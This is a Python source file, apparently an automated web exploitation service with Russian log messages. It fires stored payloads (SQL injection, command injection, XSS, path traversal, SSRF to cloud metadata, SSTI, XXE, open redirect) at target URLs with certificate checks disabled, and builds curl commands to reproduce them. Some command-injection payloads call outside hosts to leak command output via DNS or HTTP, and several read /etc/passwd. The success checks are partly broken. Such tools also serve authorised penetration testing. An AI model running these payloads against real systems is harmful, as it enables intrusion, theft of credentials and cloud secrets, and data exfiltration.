import json
import logging
import time
from typing import Dict, Optional, Tuple
from urllib3 import disable_warnings  # pip install urllib3 если нет
disable_warnings()
import requests
import urllib.parse
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

urlquote = urllib.parse.quote

class ExploiterService:
    def __init__(self):
        self.payloads = {
            "SQL Injection": [
                "' OR '1'='1' -- ",
                "' OR '1'='1'#{",
                "1' OR 1=1 LIMIT 1 -- -",
                "admin'--",
                "1' UNION SELECT NULL, username, password FROM users -- ",
                "1' AND (SELECT 1 FROM (SELECT SLEEP(7))a) -- ",
            ],
            "Command Injection": [
                ";id",
                "|id",
                "&&id",
                ";whoami",
                "|whoami",
                ";cat /etc/passwd",
                ";curl http://canarytokens.com/stuff",
                "$(whoami)",
                "`id`",
                ";nslookup `whoami`.{{YOUR_DOMAIN}}.burpcollaborator.net",
            ],
            "XSS": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "\"'><script>alert(1)</script>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
            ],
            "Path Traversal": [
                "../../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "/etc/passwd",
                "....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ],
            "SSRF": [
                "http://169.254.169.254/latest/meta-data/",
                "http://127.0.0.1:22",
                "http://localhost/admin",
                "file:///etc/passwd",
                "http://burpcollaborator.net",
            ],
            "SSTI": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{% debug %}",
                "{{config}}",
                "{{''.class.__mro__[1].__subclasses__()}}",
            ],
            "XXE": [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://burpcollaborator.net">]><root>&test;</root>',
            ],
            "Open Redirect": [
                "//google.com",
                "http://evil.com",
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
            ]
        }

        self.success_indicators = {
            "SQL Injection": [
                "syntax error", "mysql_fetch", "ORA-", "SQL Server", "PostgreSQL",
                "SQLite", "root:x:", "admin", "password", "sleep(", "benchmark("
            ],
            "Command Injection": [
                "uid=", "gid=", "www-data", "root:x:", "daemon", "bin", "bash: ",
                "whoami", "nslookup", "ping", "cat: /etc/passwd"
            ],
            "XSS": ["<script>alert(1)</script>", "onerror=alert", "onload=alert"],
            "Path Traversal": ["root:x:", "/bin/bash", "www-data", "[system]", "[passwd]"],
            "SSRF": ["metadata", "role", "ami-id", "404", "Connection refused"],
            "SSTI": ["49", "343", "config", "lipsum", "debug", "class"],
            "XXE": ["root:x:", "www-data", "<!DOCTYPE", "[entities]"],
            "Open Redirect": []  # проверяем только редирект на внешний домен
        }
    @staticmethod
    def inject_payload(url, param, payload):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        qs[param] = payload

        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def try_exploit(
        self,
        vuln_type: str,
        url: str,
        method: str,
        param: str,
        data: Dict = None,
        headers: Dict = None,
        cookies: Dict = None
    ) -> Tuple[bool, str, Optional[str]]:

        if vuln_type not in self.payloads:
            return False, "Тип уязвимости не поддерживается", None

        headers = headers or {}
        cookies = cookies or {}
        data = data or {}

        logger.info(f"[*] Начинаем автоматическую эксплуатацию: {vuln_type} в {url}")
        logger.info(f"[*] Начинаем автоматическую эксплуатацию (сookies): {cookies}")
        payload = data.get("payloads")

        try:
            if method.upper() == "GET":
                test_url = self.inject_payload(url, param, payload)
                logger.info(f"[*] Начинаем автоматическую эксплуатацию: {vuln_type} в {test_url}")
                response = requests.get(
                    test_url,
                    headers=headers,
                    cookies=cookies,
                    verify=False,
                    timeout=12,
                    allow_redirects=vuln_type != "Open Redirect"
                )
            else:
                test_data = data.copy()
                if param in test_data:
                    test_data[param] = payload
                elif "json" in headers.get("Content-Type", ""):
                    test_data = json.loads(test_data.get("raw", "{}"))
                    self._set_nested_param(test_data, param, payload)
                    test_data = json.dumps(test_data)
                else:
                    test_data[param] = payload

                response = requests.request(
                    method=method,
                    url=url,
                    data=test_data,
                    headers=headers,
                    cookies=cookies,
                    verify=False,
                    timeout=12
                )

            content = response.text.lower()
            if vuln_type == "Open Redirect":
                if response.url and "google.com" in response.url or "evil.com" in response.url:
                    success_msg = f"Редирект на внешний сайт: {response.url}"
                    return True, success_msg, payload

            if vuln_type == "XSS":
                if urllib.parse.quote(payload.lower()) in content or payload.lower() in content:
                    return True, "Payload отражён в HTML — возможен XSS.", payload

            time.sleep(0.3)

        except Exception as e:
            logger.warning(f"Ошибка при попытке: {e}")
            return False, "Ошибка", None

        return False, "Автоматическая эксплуатация не удалась. Попробуйте вручную.", None

    @staticmethod
    def _set_nested_param(obj, param_path: str, value):
        keys = param_path.split(".")
        if len(keys) > 1:
            current = obj
            for k in keys[:-1]:
                current = current.setdefault(k, {})
            current[keys[-1]] = value
        else:
            obj[param_path] = value

    @staticmethod
    def _make_curl(url: str, method: str, param: str, payload: str, _: dict, headers: dict, cookies: dict) -> str:
        cmd = ["curl", "-s"]

        for k, v in headers.items():
            cmd.append(f"-H '{k}: {v}'")

        for k, v in cookies.items():
            cmd.append(f"--cookie '{k}={v}'")

        if method.upper() == "POST":
            cmd.append("-X POST")
            if "application/json" in headers.get("Content-Type", ""):
                cmd.append(f"-d '{json.dumps({param: payload})}'")
            else:
                cmd.append(f"-d '{param}={urlquote(payload)}'")
        else:
            final_url = url.replace(f"{{{param}}}", urlquote(payload))
            cmd.append(f'"{final_url}"')

        return " \\ \n    ".join(cmd)